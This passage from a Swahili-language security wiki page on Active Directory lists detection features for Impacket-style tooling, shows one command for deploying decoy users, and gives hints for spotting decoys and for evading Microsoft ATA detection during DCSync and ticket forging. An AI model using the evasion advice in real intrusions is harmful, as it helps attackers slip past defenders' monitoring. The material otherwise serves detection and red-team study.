- WMI `IWbemLevel1Login::NTLMLogin` inayotumia namespace isiyo ya kawaida `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse au duplicated Kerberos etype lists, `PA-DATA` zisizo za kawaida/kukosekana, au TGS-REQ etype ordering inayotofautiana na native Windows
- NTLM Type 1 messages zisizo na version info au Type 3 messages zenye null host names
- Raw NTLMSSP iliyobebwa kwenye DCE/RPC badala ya SPNEGO, DCE/RPC verification trailers zilizokosekana, au SPNEGO/Kerberos OID mismatches
- Sifa kadhaa kati ya hizi kutoka kwenye host/user/session/time window moja zina nguvu zaidi kuliko field yoyote dhaifu
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, na tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Hizi ni rahisi kwa operators kubadilisha na hutumiwa vizuri zaidi kueleza kwa nini cross-protocol cluster inatiliwa shaka
- **Operational notes**:
- Baadhi ya signals hizi zinahitaji traffic iliyodecryptiwa, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au service-side visibility
- Zihakiki dhidi ya Samba/Linux clients, appliances, na legacy software kabla ya kuzipeleka kwenye alerts
- Pandisha detections kutoka enrichment -> hunting -> alerting kadri unavyojenga confidence katika baseline

### **Implementing Deception Techniques**

- Kutekeleza deception kunahusisha kuweka traps, kama decoy users au computers, zenye features kama passwords ambazo hazi-expire au zilizowekwa alama ya Trusted for Delegation. Mbinu ya kina inajumuisha kuunda users wenye rights maalum au kuwaongeza kwenye high privilege groups.<sup>[[2]](#references)</sup>
- Mfano wa vitendo unahusisha kutumia tools kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi kuhusu ku-deploy deception techniques inapatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicators zinazotia shaka zinajumuisha ObjectSID isiyo ya kawaida, logons zisizo za mara kwa mara, creation dates, na bad password counts zilizo chini.
- **General Indicators**: Kulinganisha attributes za decoy objects zinazowezekana na zile za genuine objects kunaweza kufichua inconsistencies. Tools kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua deceptions kama hizo.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia ATA detection.
- **Ticket Impersonation**: Kutumia **aes** keys kwa ticket creation husaidia kukwepa detection kwa kutodowngrade kwenda NTLM.
- **DCSync Attacks**: Inashauriwa kutekeleza kutoka kwenye non-Domain Controller ili kuepuka ATA detection, kwa kuwa execution ya moja kwa moja kutoka kwenye Domain Controller itasababisha alerts.

## References

- [1] [Mwongozo wa Kushambulia Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kughushi Trusts kwa Deception katika Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Kutoka Domain Admin hadi Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit kwa Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Kutumia NTLM Hashes kama Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Kuchanganua Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Kuteka Akaunti za Active Directory kupitia Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jinsi ya kudhibiti mabadiliko katika Netlogon secure channel connections yanayohusishwa na CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Safari katika Null Session na MS-RPC interfaces zilizosahaulika](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kama security boundary kati ya domains? (Sehemu ya 4) - Utafiti wa Bypass SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kama security boundary kati ya domains? (Sehemu ya 5) - Golden GMSA trust attack - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kama security boundary kati ya domains? (Sehemu ya 6) - Schema change trust attack - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Kutoka DA hadi EA kwa ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Kuinuka kutoka admins wa child domain hadi enterprise admins ndani ya dakika 5 kwa kutumia vibaya AD CS, mwendelezo](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE Iliyofichwa: Kubuni Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
